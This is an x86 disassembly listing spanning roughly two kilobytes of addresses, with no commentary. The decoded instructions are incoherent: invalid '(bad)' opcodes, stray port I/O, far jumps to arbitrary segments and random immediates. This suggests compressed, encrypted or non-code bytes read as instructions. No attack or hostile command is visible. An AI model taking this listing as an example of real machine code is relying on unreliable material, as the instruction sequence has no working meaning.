  40d5ee:	dec    ecx
  40d5ef:	(bad)  
  40d5f0:	lods   eax,DWORD PTR ds:[esi]
  40d5f1:	in     al,dx
  40d5f2:	idiv   BYTE PTR [ecx*1+0x46cf6268]
  40d5f9:	adc    eax,0x6654d036
  40d5fe:	outs   dx,BYTE PTR ds:[esi]
  40d5ff:	xchg   ecx,eax
  40d600:	ins    BYTE PTR es:[edi],dx
  40d601:	sar    BYTE PTR [eax+edi*8],1
  40d604:	fnstenv [ecx-0x35]
  40d607:	sar    edx,cl
  40d609:	out    0xf8,eax
  40d60b:	xchg   ebx,eax
  40d60c:	inc    edi
  40d60d:	sbb    eax,edx
  40d60f:	jmp    0x412f75aa
  40d614:	jge    0x40d5d6
  40d616:	sbb    edx,edx
  40d618:	mov    fs,WORD PTR [ebx-0x604a9787]
  40d61e:	mov    WORD PTR [ecx+0x45426160],cs
  40d624:	mov    ecx,0x982fed0e
  40d629:	test   DWORD PTR [ebx+0x3a681d25],0x189c5464
  40d633:	mov    dl,BYTE PTR [edx-0x3f218c8b]
  40d639:	mul    DWORD PTR [edi-0x16f2d90a]
  40d63f:	pushf  
  40d640:	xor    eax,0x5383bdaf
  40d645:	je     0x40d62c
  40d647:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d648:	lock push ss
  40d64a:	adc    al,0x8b
  40d64d:	cmc    
  40d64e:	loopne 0x40d62d
  40d650:	dec    edx
  40d651:	jp     0x40d603
  40d653:	sbb    DWORD PTR [edi-0x6b3b967a],0x9e01377b
  40d65d:	clc    
  40d65e:	into   
  40d65f:	cmp    ah,al
  40d661:	gs in  al,0xfc
  40d664:	js     0x40d6e3
  40d666:	dec    ebp
  40d667:	test   eax,0xfa1dba6d
  40d66c:	cmp    al,0xff
  40d66e:	data16 or bh,BYTE PTR [ebx-0x6a894f3]
  40d675:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40d677:	mov    al,0x38
  40d679:	xlat   BYTE PTR ds:[ebx]
  40d67a:	(bad)  
  40d67b:	or     BYTE PTR [ecx],ah
  40d67d:	test   BYTE PTR [ecx-0x28d72ede],0x38
  40d684:	mov    dl,0xef
  40d686:	push   ebx
  40d687:	jmp    0x2f459a30
  40d68c:	loope  0x40d6da
  40d68e:	unpckhps xmm4,XMMWORD PTR [ebx]
  40d691:	xor    edi,DWORD PTR [ecx-0x4e]
  40d694:	sahf   
  40d695:	out    dx,al
  40d696:	push   ss
  40d697:	sbb    al,0x56
  40d699:	(bad)  
  40d69a:	jnp    0x40d626
  40d69c:	mov    ah,0x3e
  40d69e:	fild   DWORD PTR [ebx+0x68]
  40d6a1:	mov    eax,0x4f880cbd
  40d6a6:	dec    esp
  40d6a7:	aas    
  40d6a8:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40d6aa:	ret    0xe68b
  40d6ad:	addr16 stc 
  40d6af:	mov    edx,DWORD PTR [edx]
  40d6b1:	loopne 0x40d6ad
  40d6b3:	cwde   
  40d6b4:	das    
  40d6b5:	sbb    ebx,DWORD PTR [ebx+ebp*2+0x67]
  40d6b9:	xchg   edx,eax
  40d6ba:	dec    ecx
  40d6bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6bc:	test   al,0xbb
  40d6be:	addr16 sar edx,cl
  40d6c1:	rcr    DWORD PTR [edx-0x64d55e21],cl
  40d6c7:	shl    DWORD PTR [esi],0xd8
  40d6ca:	inc    ecx
  40d6cb:	int    0x8
  40d6cd:	jbe    0x40d6a2
  40d6cf:	mov    ecx,0xb7419da5
  40d6d4:	js     0x40d65a
  40d6d6:	inc    esp
  40d6d7:	xchg   edx,eax
  40d6d8:	mov    ebx,DWORD PTR [eax-0x1b]
  40d6db:	lahf   
  40d6dc:	push   edi
  40d6dd:	or     DWORD PTR [eax-0x3051ddd7],ebx
  40d6e3:	push   edx
  40d6e4:	and    al,0x33
  40d6e6:	xor    BYTE PTR [eax-0x66b46489],al
  40d6ec:	call   0xf11ada5a
  40d6f1:	gs or  esi,0x16
  40d6f5:	cmp    DWORD PTR [ebx],edx
  40d6f7:	add    eax,0x12f7b1c1
  40d6fc:	inc    ecx
  40d6fd:	daa    
  40d6fe:	das    
  40d6ff:	mov    eax,ds:0xbb3b2788
  40d704:	cld    
  40d705:	and    eax,0x3eb04b62
  40d70a:	or     bl,BYTE PTR [edx-0x523df10]
  40d710:	mov    eax,0x2e2d0e19
  40d715:	test   BYTE PTR ds:0xa1f84094,cl
  40d71b:	rcr    DWORD PTR [eax-0x2],1
  40d71e:	in     eax,0x25
  40d720:	mov    ds:0x33e67978,al
  40d725:	inc    edi
  40d726:	test   ecx,ebx
  40d728:	sbb    eax,0x72620b2e
  40d72d:	pop    ebx
  40d72e:	and    al,cl
  40d730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d731:	fisttp WORD PTR [ecx-0x71]
  40d734:	int    0xbe
  40d736:	mov    bl,BYTE PTR [ebx]
  40d738:	test   al,0x56
  40d73a:	sbb    bl,ah
  40d73c:	pop    ebp
  40d73d:	ss dec ebp
  40d73f:	or     BYTE PTR [edi+0x58033ead],al
  40d745:	push   eax
  40d746:	xchg   ebp,eax
  40d747:	shl    DWORD PTR [ecx],0x89
  40d74a:	adc    esi,DWORD PTR [edx+edx*1-0x1eb49958]
  40d751:	sub    eax,0x59ed253c
  40d756:	add    ecx,eax
  40d758:	pop    ds
  40d759:	cld    
  40d75a:	pushf  
  40d75b:	mov    al,ds:0xd8a16396
  40d761:	int    0x26
  40d763:	sub    edx,DWORD PTR [ebp+0x76]
  40d766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d767:	test   ah,cl
  40d769:	add    eax,0x186316c2
  40d76e:	mov    esi,0xdd29cb8b
  40d773:	icebp  
  40d774:	ss int 0xa9
  40d777:	push   esi
  40d778:	sar    cl,0xcf
  40d77b:	push   es
  40d77c:	in     al,0xd3
  40d77e:	outs   dx,DWORD PTR ds:[esi]
  40d77f:	cmp    bh,bl
  40d781:	call   0x2e15070
  40d786:	outs   dx,DWORD PTR ds:[esi]
  40d787:	or     ch,BYTE PTR [ebp+0x20fde4f1]
  40d78d:	ins    BYTE PTR es:[edi],dx
  40d78e:	adc    bl,dl
  40d790:	cdq    
  40d791:	cmp    al,0xb6
  40d793:	mov    ebx,edi
  40d795:	stc    
  40d796:	push   ss
  40d797:	xor    ebp,DWORD PTR [ecx+0x5f]
  40d79a:	jmp    0x40d7ea
  40d79c:	jle    0x40d736
  40d79e:	xchg   ebx,eax
  40d79f:	sbb    DWORD PTR [esi+0x3e],esi
  40d7a2:	mov    eax,DWORD PTR [ecx+0x545aefb2]
  40d7a8:	xor    esi,DWORD PTR [ecx+0x487d201b]
  40d7ae:	icebp  
  40d7af:	mov    ah,0x68
  40d7b1:	mov    al,ds:0xac2238eb
  40d7b6:	cwde   
  40d7b7:	mov    ds:0xb80f3dd6,al
  40d7bc:	push   ebx
  40d7bd:	call   0x7cefabc8
  40d7c2:	int    0x6a
  40d7c4:	pop    esi
  40d7c5:	call   0x984ff101
  40d7ca:	adc    al,0x76
  40d7cc:	pop    ds
  40d7cd:	sbb    ebx,edi
  40d7cf:	sbb    ebp,DWORD PTR [edi+0x74]
  40d7d2:	sub    ebx,DWORD PTR [edx]
  40d7d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7d5:	push   0xe52c5ffa
  40d7da:	aaa    
  40d7db:	in     al,0x8
  40d7dd:	or     BYTE PTR [eax+0x51ca7087],ah
  40d7e3:	mov    al,0x5b
  40d7e5:	inc    BYTE PTR [ebx-0x37c19ef4]
  40d7eb:	sti    
  40d7ec:	jl     0x40d7b0
  40d7ee:	xor    bh,BYTE PTR [eax+edi*8]
  40d7f1:	mov    eax,0x62c46edc
  40d7f6:	push   eax
  40d7f7:	stos   DWORD PTR es:[edi],eax
  40d7f8:	rcl    BYTE PTR [esi+0x2a],1
  40d7fb:	pop    esi
  40d7fc:	sar    BYTE PTR [eax+edx*8-0x8fba359],1
  40d803:	ret    0xd04b
  40d806:	test   al,0xc
  40d808:	mov    esp,0x392ebe61
  40d80d:	and    ch,ah
  40d80f:	popa   
  40d810:	pop    ss
  40d811:	das    
  40d812:	ds cmp eax,0xd3d6a7c9
  40d818:	adc    BYTE PTR ds:0xecdc4fbc,al
  40d81e:	call   0x170d:0x66d091fb
  40d825:	cli    
  40d826:	inc    ebx
  40d827:	cmp    eax,0xe1559582
  40d82c:	sbb    ah,BYTE PTR [edi+0x64]
  40d82f:	push   ebx
  40d830:	repz loope 0x40d868
  40d833:	shl    BYTE PTR [ecx-0x11],1
  40d836:	add    BYTE PTR [eax],dl
  40d838:	dec    eax
  40d839:	cmc    
  40d83a:	mov    bl,0xdd
  40d83c:	fsubr  QWORD PTR [ecx-0x527ea2bf]
  40d842:	clc    
  40d843:	mov    bh,0xd6
  40d845:	shl    DWORD PTR [edx+0x2f],cl
  40d848:	ror    DWORD PTR [esi+0x4],cl
  40d84b:	xlat   BYTE PTR ds:[ebx]
  40d84c:	test   eax,0x7cee8fb2
  40d851:	js     0x40d8c2
  40d853:	cmp    DWORD PTR [eax],0xffffff81
  40d856:	sub    eax,0x17c7660f
  40d85b:	aaa    
  40d85c:	xchg   ecx,eax
  40d85d:	xlat   BYTE PTR ds:[ebx]
  40d85e:	sbb    al,0xb5
  40d860:	repz div DWORD PTR [eax+esi*2]
  40d864:	cmp    esi,ecx
  40d866:	inc    edx
  40d867:	mov    cl,0x65
  40d869:	mov    dh,BYTE PTR [eax]
  40d86b:	push   edi
  40d86c:	push   ebx
  40d86d:	bound  edx,QWORD PTR [edx-0x5c]
  40d870:	jns    0x40d8bb
  40d872:	lods   eax,DWORD PTR ds:[esi]
  40d873:	out    0xb3,al
  40d875:	out    dx,al
  40d876:	add    eax,0x8c2c76e8
  40d87b:	push   ebp
  40d87c:	retf   
  40d87d:	jae    0x40d814
  40d87f:	mov    esi,DWORD PTR [ebp-0x58]
  40d882:	xchg   esp,eax
  40d883:	xchg   eax,eax
  40d885:	pushw  ss
  40d887:	fld    DWORD PTR cs:[ebp-0x26]
  40d88b:	es (bad) 
  40d88d:	fucom  st(6)
  40d88f:	xor    ah,BYTE PTR [edx-0x56]
  40d892:	jmp    0x40d825
  40d894:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d895:	jl     0x40d84f
  40d897:	out    0xc9,al
  40d899:	push   eax
  40d89a:	out    dx,eax
  40d89b:	pop    ss
  40d89c:	rcl    BYTE PTR [edi+0x4b],cl
  40d89f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8a0:	dec    esi
  40d8a1:	call   FWORD PTR [ebp+0x15]
  40d8a4:	cmp    eax,0x4fcb60dd
  40d8a9:	mov    DWORD PTR [eax-0x3161765f],ebp
  40d8af:	jns    0x40d92f
  40d8b1:	loop   0x40d8dd
  40d8b3:	push   edi
  40d8b4:	outs   dx,DWORD PTR ds:[esi]
  40d8b5:	xor    ebx,edx
  40d8b7:	retf   
  40d8b8:	push   edi
  40d8b9:	mov    edi,0xc2bb85e6
  40d8be:	sahf   
  40d8bf:	(bad)  
  40d8c0:	adc    eax,0x1d62a2b3
  40d8c5:	add    eax,0xddcb7ee3
  40d8ca:	pop    ebp
  40d8cb:	pop    ds
  40d8cc:	pop    esi
  40d8cd:	lock popf 
  40d8cf:	stos   BYTE PTR es:[edi],al
  40d8d0:	jne    0x40d945
  40d8d2:	cdq    
  40d8d3:	frstor [esi+edi*8-0x3c]
  40d8d7:	scas   eax,DWORD PTR es:[edi]
  40d8d8:	mov    ch,0x85
  40d8da:	cmp    esi,edi
  40d8dc:	addr16 jb 0x40d892
  40d8df:	arpl   WORD PTR [edi+0x35],dx
  40d8e2:	mov    edx,0xd3b6264a
  40d8e7:	(bad)  
  40d8e8:	mov    cl,0x84
  40d8ea:	movd   DWORD PTR [edi+0xd73b61d],mm1
  40d8f1:	cmc    
  40d8f2:	inc    eax
  40d8f3:	aam    0x68
  40d8f5:	(bad)  
  40d8f6:	jmp    0x8b6a:0xdbdbfa15
  40d8fd:	pop    es
  40d8fe:	xor    al,0x6
  40d900:	adc    DWORD PTR [ecx-0x19],ecx
  40d903:	sub    dl,cl
  40d905:	xchg   esp,eax
  40d906:	ds xchg edx,eax
  40d908:	sbb    ecx,ebp
  40d90a:	jle    0x40d8e5
  40d90c:	inc    esp
  40d90d:	inc    eax
  40d90e:	mov    DWORD PTR [ecx],ebx
  40d910:	in     al,0x67
  40d912:	ror    BYTE PTR [eax+0x4],0xa7
  40d916:	stc    
  40d917:	mov    esp,0x55fca64f
  40d91c:	aam    0x99
  40d91e:	(bad)  
  40d920:	ss dec bx
  40d923:	jecxz  0x40d8df
  40d925:	mov    ds:0xd07417d2,al
  40d92a:	sti    
  40d92b:	les    esi,FWORD PTR [edi]
  40d92d:	(bad)  
  40d92e:	xchg   ebp,eax
  40d92f:	push   edi
  40d930:	mov    edi,0x7f78bef6
  40d935:	cli    
  40d936:	iret   
  40d937:	xchg   esp,esi
  40d939:	aas    
  40d93a:	mov    edx,0xfb93d98
  40d93f:	sbb    ebp,esi
  40d941:	icebp  
  40d942:	js     0x40d988
  40d944:	fnstenv [eax-0x5a]
  40d947:	or     DWORD PTR cs:[ebp-0x5b93ae01],eax
  40d94e:	ret    0xb082
  40d951:	popa   
  40d952:	enter  0xc3ea,0xb6
  40d956:	retf   
  40d957:	adc    dh,cl
  40d959:	std    
  40d95a:	and    ebx,DWORD PTR [edi+eiz*2-0x80]
  40d95e:	lods   eax,DWORD PTR ds:[esi]
  40d95f:	ins    DWORD PTR es:[edi],dx
  40d960:	add    DWORD PTR [edi],esi
  40d962:	pop    edx
  40d963:	(bad)  
  40d964:	lock (bad) [eax+0x3f8c5588]
  40d96b:	in     al,0xc
  40d96d:	mov    BYTE PTR [esi+0x28],ch
  40d970:	xchg   ecx,eax
  40d971:	imul   esp,DWORD PTR [edx+0x4df0bbfc],0xc039979a
  40d97b:	mov    BYTE PTR [ebx],bh
  40d97d:	mov    dl,0xbf
  40d97f:	sub    ebx,DWORD PTR [ecx-0x39]
  40d982:	(bad)  
  40d983:	into   
  40d984:	dec    ebx
  40d985:	push   esp
  40d986:	sahf   
  40d987:	ss retf 0xa080
  40d98b:	pop    ss
  40d98c:	pop    DWORD PTR [esp+ebp*8-0x1002836]
  40d993:	add    DWORD PTR [eax],edi
  40d995:	mov    bl,0x8c
  40d997:	mov    esi,0xfc56c10f
  40d99c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d99d:	sti    
  40d99e:	int    0xc
  40d9a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9a1:	lock lea eax,[eax-0x5]
  40d9a5:	pop    esp
  40d9a6:	mov    edi,0xf10a8d61
  40d9ab:	call   0xa41a:0xe06c3202
  40d9b2:	push   ecx
  40d9b4:	in     eax,dx
  40d9b5:	mov    ch,0x78
  40d9b7:	lea    ebp,[eax+0x77058618]
  40d9bd:	adc    eax,0xb4987a4a
  40d9c2:	(bad)  
  40d9c3:	sar    cl,0x1f
  40d9c6:	sbb    ebx,DWORD PTR [edx-0x2c]
  40d9c9:	push   ebx
  40d9ca:	and    ecx,DWORD PTR [edx-0xca761dc]
  40d9d0:	adc    BYTE PTR [ebx+0x78],dh
  40d9d3:	mov    WORD PTR [ecx-0x77337f85],ss
  40d9d9:	push   eax
  40d9da:	inc    edx
  40d9db:	fidiv  WORD PTR [edi+ebp*8-0x362ef8a2]
  40d9e2:	pop    ebx
  40d9e3:	add    ebp,edi
  40d9e5:	leave  
  40d9e6:	and    bl,BYTE PTR [ebx+0x2f88abcc]
  40d9ec:	pop    es
  40d9ed:	mov    edi,0x5772f9bf
  40d9f2:	mov    ebp,0xfe0fb579
  40d9f7:	mov    ebx,0xbb0a28ad
  40d9fc:	sbb    eax,0xd229fc44
  40da01:	fcomi  st,st(2)
  40da03:	ja     0x40da23
  40da05:	xchg   ebp,eax
  40da06:	mov    eax,0x99ef1fc5
  40da0b:	(bad)  
  40da0c:	mov    dh,0x6
  40da0e:	sahf   
  40da0f:	or     eax,0x4d249455
  40da14:	mov    WORD PTR [edi-0x7d],es
  40da17:	sar    DWORD PTR [esi+0x6d],cl
  40da1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da1b:	or     al,0x93
  40da1d:	ja     0x40da56
  40da1f:	jmp    0x5f1f:0x99950850
  40da26:	popa   
  40da27:	sub    al,0x26
  40da29:	sub    DWORD PTR [edi],0x4ad8a651
  40da2f:	mov    ebx,0x2339b0f
  40da34:	xchg   ecx,eax
  40da35:	mov    WORD PTR [eax+edx*1-0x2],ds
  40da39:	pop    ebp
  40da3a:	push   ss
  40da3b:	jl     0x40da72
  40da3d:	aad    0xa8
  40da3f:	scas   eax,DWORD PTR es:[edi]
  40da40:	pop    esi
  40da41:	stos   BYTE PTR es:[edi],al
  40da42:	jmp    0xbdac:0x5864a304
  40da49:	jp     0x40d9da
  40da4b:	jo     0x40d9e6
  40da4d:	ja     0x40d9d3
  40da4f:	dec    edx
  40da50:	fstp   DWORD PTR [ecx-0x49]
  40da53:	push   esi
  40da54:	jb     0x40dace
  40da56:	push   ebx
  40da57:	mov    es,WORD PTR [ebp-0x530e608e]
  40da5d:	into   
  40da5e:	cmc    
  40da5f:	mov    bl,0x1
  40da61:	lods   al,BYTE PTR ds:[esi]
  40da62:	sub    BYTE PTR [esi+0x32],ah
  40da65:	sub    eax,0x57807008
  40da6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da6b:	xor    BYTE PTR [esp+eax*1+0x6775426b],dh
  40da72:	xchg   esi,eax
  40da73:	rcr    DWORD PTR ds:0xd3e60c8e,cl
  40da79:	bound  esp,QWORD PTR [ebx+0x6813a681]
  40da7f:	mov    eax,0x80b2c7dd
  40da84:	inc    ecx
  40da85:	sbb    cl,cl
  40da87:	dec    esp
  40da88:	ret    0x3506
  40da8b:	or     DWORD PTR [edx-0x3],edi
  40da8e:	mov    edi,DWORD PTR [ebp+0x68]
  40da91:	add    al,0xb
  40da93:	push   edx
  40da94:	jg     0x40da32
  40da96:	ins    BYTE PTR es:[edi],dx
  40da97:	pusha  
  40da98:	fnsave [ebp-0x6f]
  40da9b:	mov    ds:0xbec4ccd9,al
  40daa0:	fdivr  QWORD PTR [ebp-0x28]
  40daa3:	lods   al,BYTE PTR ds:[esi]
  40daa4:	sub    ebx,edi
  40daa6:	xor    bl,BYTE PTR [esi-0x63705833]
  40daac:	mov    eax,0xbe715d30
  40dab1:	xchg   ebx,eax
  40dab2:	jbe    0x40dabb
  40dab4:	imul   edi,DWORD PTR [esi+0x1e8b9d5d],0xffffff93
  40dabb:	or     ebx,DWORD PTR [eax+0x75509a05]
  40dac1:	mov    edx,0x86ba4ac8
  40dac6:	pusha  
  40dac7:	jns    0x40daee
  40dac9:	push   edx
  40daca:	arpl   WORD PTR [eax+0x52d0c5b6],bp
  40dad0:	je     0x40da72
  40dad2:	inc    edx
  40dad3:	adc    eax,0x1f75ae25
  40dad8:	pushf  
  40dad9:	test   al,0x95
  40dadb:	ins    BYTE PTR es:[edi],dx
  40dadc:	xor    BYTE PTR [esi],dl
  40dade:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dadf:	jecxz  0x40db10
  40dae1:	popf   
  40dae2:	rcl    DWORD PTR [eax+edx*8+0x65b11e9b],0x9e
  40daea:	int    0x5a
  40daec:	mov    ebx,0x1cd5438c
  40daf1:	mov    ds:0x8e4cffad,al
  40daf6:	dec    ebp
  40daf7:	mov    al,0x4f
  40daf9:	or     esi,DWORD PTR [ecx]
  40dafb:	loopne 0x40db17
  40dafd:	sbb    BYTE PTR [eax],al
  40daff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db00:	js     0x40db4f
  40db02:	or     esp,DWORD PTR fs:[ecx]
  40db05:	shl    DWORD PTR [ebp-0x238d7412],1
  40db0b:	fdivp  st(3),st
  40db0d:	add    al,0xbc
  40db0f:	jecxz  0x40db8c
  40db11:	or     al,0x93
  40db13:	int    0x90
  40db15:	dec    edx
  40db16:	dec    esp
  40db17:	jae    0x40daff
  40db19:	popa   
  40db1a:	jno    0x40daca
  40db1c:	xchg   ecx,eax
  40db1d:	xchg   edx,eax
  40db1e:	adc    al,0xdf
  40db20:	jno    0x40db38
  40db22:	out    dx,al
  40db23:	jmp    0x40db5d
  40db25:	(bad)  
  40db27:	xchg   DWORD PTR [ecx],ebp
  40db29:	sub    ah,bh
  40db2b:	jge    0x40db47
  40db2d:	js     0x40db44
  40db2f:	push   edi
  40db30:	adc    al,0x12
  40db32:	jmp    0x2efe:0xbdc1fae5
  40db39:	jb     0x40db0e
  40db3b:	adc    eax,0xe35542dd
  40db40:	not    DWORD PTR [edx+eax*1+0x4965b701]
  40db47:	out    0x4e,eax
  40db49:	out    0x44,eax
  40db4b:	and    dl,ch
  40db4d:	add    ah,BYTE PTR [edi*8+0x2005c2dd]
  40db54:	and    DWORD PTR [ecx],ebx
  40db56:	(bad)  
  40db57:	sti    
  40db58:	mov    ds:0x92eac4a5,al
  40db5d:	sbb    ebx,DWORD PTR ss:[ebx-0x34461b2c]
  40db64:	cli    
  40db65:	push   edi
  40db66:	mov    ds:0xdac9e490,eax
  40db6b:	xchg   esi,eax
  40db6c:	(bad)  
  40db6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db6f:	pop    ds
  40db70:	into   
  40db71:	dec    esi
  40db72:	dec    esp
  40db73:	add    edx,DWORD PTR [eax+0x70]
  40db76:	add    al,0x7
  40db78:	xor    DWORD PTR [edx+0x7b97e84a],ecx
  40db7e:	(bad)  
  40db80:	or     DWORD PTR [esi-0x25b4f566],ebx
  40db86:	ret    0xe937
  40db89:	inc    eax
  40db8a:	data16 xor al,0xd2
  40db8d:	retf   0x7565
  40db90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db91:	dec    ecx
  40db92:	sub    ah,BYTE PTR [eax+eiz*4]
  40db95:	jb     0x40dbf3
  40db97:	pop    ecx
  40db98:	push   eax
  40db99:	inc    eax
  40db9a:	cmp    ebp,ebx
  40db9c:	push   ds
  40db9d:	jnp    0x40dbcf
  40db9f:	jmp    0x172a:0x60406a99
  40dba6:	xlat   BYTE PTR ds:[ebx]
  40dba7:	(bad)  
  40dba8:	std    
  40dba9:	inc    esp
  40dbaa:	into   
  40dbab:	cmp    al,0x69
  40dbad:	ror    BYTE PTR [ecx+0x59],1
  40dbb0:	mov    DWORD PTR [edx+0x1d],ecx
  40dbb3:	ror    DWORD PTR [ecx-0x55],1
  40dbb6:	ins    BYTE PTR es:[edi],dx
  40dbb7:	loope  0x40db87
  40dbb9:	aad    0x6e
  40dbbb:	jmp    0x1938:0x95b0f38b
  40dbc2:	jl     0x40db80
  40dbc4:	loopne 0x40dbdb
  40dbc6:	xchg   eax,ecx
  40dbc8:	pop    es
  40dbc9:	retf   0xf99a
  40dbcc:	mov    edx,0xf0c14e2f
  40dbd1:	aam    0xb9
  40dbd3:	cmp    cl,BYTE PTR [ebx-0x78]
  40dbd6:	dec    esi
  40dbd7:	mov    dh,0x72
  40dbd9:	adc    BYTE PTR [esi+0x4],dl
  40dbdc:	dec    ecx
  40dbdd:	push   ss
  40dbde:	call   0xe93a:0x355d7f04
  40dbe5:	pushf  
  40dbe6:	bnd jae 0x40db8e
  40dbe9:	inc    DWORD PTR [eax+ebx*2+0x29]
  40dbed:	mov    eax,ds:0x258fb777
  40dbf2:	mov    ds:0x12ce6333,al
  40dbf7:	enter  0xeeb2,0x84
  40dbfb:	es jns 0x40dc32
  40dbfe:	enter  0xbed1,0x46
  40dc02:	xlat   BYTE PTR ds:[ebx]
  40dc03:	aaa    
  40dc04:	or     eax,0xe8ca6cfe
  40dc09:	nop
  40dc0a:	mov    ecx,DWORD PTR [eax+0x52b5cfc0]
  40dc10:	mov    al,ds:0x47db422
  40dc15:	mov    esp,0x1889fd9b
  40dc1a:	lods   eax,DWORD PTR ds:[esi]
  40dc1b:	mov    es,edx
  40dc1d:	xchg   edx,eax
  40dc1e:	aam    0x53
  40dc20:	iret   
  40dc21:	pop    ecx
  40dc22:	mov    ebp,ebx
  40dc24:	jns    0x40dc31
  40dc26:	addr16 xchg ebx,eax
  40dc28:	pop    edx
  40dc29:	add    al,0x63
  40dc2b:	and    eax,0x48f5782b
  40dc30:	pop    ecx
  40dc31:	pop    eax
  40dc32:	addr16 test eax,0x44c3feef
  40dc38:	dec    edi
  40dc39:	jmp    DWORD PTR [edx-0x70f4cb91]
  40dc3f:	inc    edx
  40dc40:	(bad)  
  40dc41:	jmp    0x588f:0x9901cfaa
  40dc48:	inc    esi
  40dc49:	pop    eax
  40dc4a:	lods   eax,DWORD PTR ds:[esi]
  40dc4b:	in     eax,0x4e
  40dc4d:	sbb    edx,ebp
  40dc4f:	inc    esi
  40dc50:	mov    ch,0x3d
  40dc52:	pop    ss
  40dc53:	xchg   BYTE PTR [ecx],bl
  40dc55:	jo     0x40dca7
  40dc57:	and    al,0x54
  40dc59:	pop    edi
  40dc5a:	fwait
  40dc5b:	xor    al,0x1
  40dc5d:	scas   al,BYTE PTR es:[edi]
  40dc5e:	sub    eax,0xcf1fc45f
  40dc63:	pop    ebp
  40dc64:	test   al,0xbd
  40dc66:	push   edi
  40dc67:	mov    DWORD PTR [ebx+eax*8-0x1c],eax
  40dc6b:	jns    0x40dc50
  40dc6d:	pop    es
  40dc6e:	and    ah,BYTE PTR [eax-0x66]
  40dc71:	lahf   
  40dc72:	cmp    edi,DWORD PTR [esi+0x31e0ba25]
  40dc78:	push   eax
  40dc79:	mov    esi,0x5edc439f
  40dc7e:	iret   
  40dc7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc80:	les    edx,FWORD PTR [ecx+eiz*4+0x266d9a10]
  40dc87:	and    ecx,esp
  40dc89:	leave  
  40dc8a:	shr    DWORD PTR [eax+edx*4+0x21],1
  40dc8e:	add    al,0x90
  40dc90:	sbb    eax,0xba39d94c
  40dc95:	inc    eax
  40dc96:	add    eax,0xa2d87e4
  40dc9b:	inc    edx
  40dc9c:	jmp    0x40dc7e
  40dc9e:	stos   DWORD PTR es:[edi],eax
  40dc9f:	dec    edx
  40dca0:	lea    esp,[ebx-0x16]
  40dca3:	call   0x5ef9dfb0
  40dca8:	xor    DWORD PTR [ebx+0x4d],0xffffffc4
  40dcac:	sbb    ecx,ebp
  40dcae:	xor    DWORD PTR [ebp+0x4375986d],esi
  40dcb4:	and    ah,dh
  40dcb6:	mov    ds:0x1de106ab,al
  40dcbb:	das    
  40dcbc:	mov    bh,0xc4
  40dcbe:	(bad)  
  40dcbf:	imul   ebp,DWORD PTR [edx-0x5a],0xffffff90
  40dcc3:	outs   dx,DWORD PTR ds:[esi]
  40dcc4:	fldcw  WORD PTR [eax+ebp*2]
  40dcc7:	or     DWORD PTR [edi+0x32d376af],edi
  40dccd:	cmc    
  40dcce:	or     al,0xc1
  40dcd0:	or     ecx,DWORD PTR [edx+0x48917d87]
  40dcd6:	into   
  40dcd7:	cs out dx,eax
  40dcd9:	add    al,0xba
  40dcdb:	lock rep stos DWORD PTR es:[edi],eax
  40dcde:	add    eax,0x58adf611
  40dce3:	cmc    
  40dce4:	lock dec edi
  40dce6:	dec    edx
  40dce7:	jg     0x40dcb0
  40dce9:	sbb    eax,0x18057521
  40dcee:	fisttp DWORD PTR [ecx]
  40dcf0:	mul    BYTE PTR [eax+0x20]
  40dcf3:	mov    ds:0x1431206d,eax
  40dcf8:	nop    esp
  40dcfb:	gs xchg edx,eax
  40dcfd:	push   esp
  40dcfe:	mov    eax,0x6f551fa7
  40dd03:	lea    ecx,[eax]
  40dd05:	fisub  WORD PTR [ebx+0x5]
  40dd08:	mov    ds:0x7d21e918,al
  40dd0d:	xchg   DWORD PTR [ebx],esp
  40dd0f:	inc    esp
  40dd10:	push   ecx
  40dd11:	es in  al,dx
  40dd13:	or     al,0xda
  40dd15:	dec    esp
  40dd16:	push   esp
  40dd17:	stc    
  40dd18:	fmul   st(2),st
  40dd1a:	fndisi(8087 only) 
  40dd1c:	dec    ebp
  40dd1d:	ins    BYTE PTR es:[edi],dx
  40dd1e:	or     esi,ebp
  40dd20:	pop    ebx
  40dd21:	dec    DWORD PTR [edx+0x5a]
  40dd24:	inc    eax
  40dd25:	outs   dx,BYTE PTR ds:[esi]
  40dd26:	les    esi,FWORD PTR [ecx-0x7e2a78bf]
  40dd2c:	push   es
  40dd2d:	xor    BYTE PTR [edi],dl
  40dd2f:	retf   
  40dd30:	out    0x6c,al
  40dd32:	or     bh,dh
  40dd34:	sub    eax,0xa6bc9b5e
  40dd39:	in     eax,0xae
  40dd3b:	push   edi
  40dd3c:	mov    ebx,0x5a0fb9d4
  40dd41:	mov    DWORD PTR [edx+edx*4+0x43],0x4c1182fd
  40dd49:	push   ebx
  40dd4a:	addr16 jg 0x40ddb1
  40dd4d:	cmp    ebx,DWORD PTR [eax-0x3e454359]
  40dd53:	sub    DWORD PTR [edx],eax
  40dd55:	bound  esp,QWORD PTR [esi]
  40dd57:	out    dx,eax
  40dd58:	push   es
  40dd59:	push   es
  40dd5a:	popf   
  40dd5b:	inc    ecx
  40dd5c:	lahf   
  40dd5d:	cmp    eax,0xd063e87b
  40dd62:	add    al,0xac
  40dd64:	stc    
  40dd65:	and    al,0x5b
  40dd67:	xor    BYTE PTR [ebx-0x33db08d],0x72
  40dd6e:	ss add al,0x1b
  40dd71:	xchg   BYTE PTR [eax-0x6e],bl
  40dd74:	popa   
  40dd75:	xchg   ebx,edi
  40dd77:	stc    
  40dd78:	push   ds
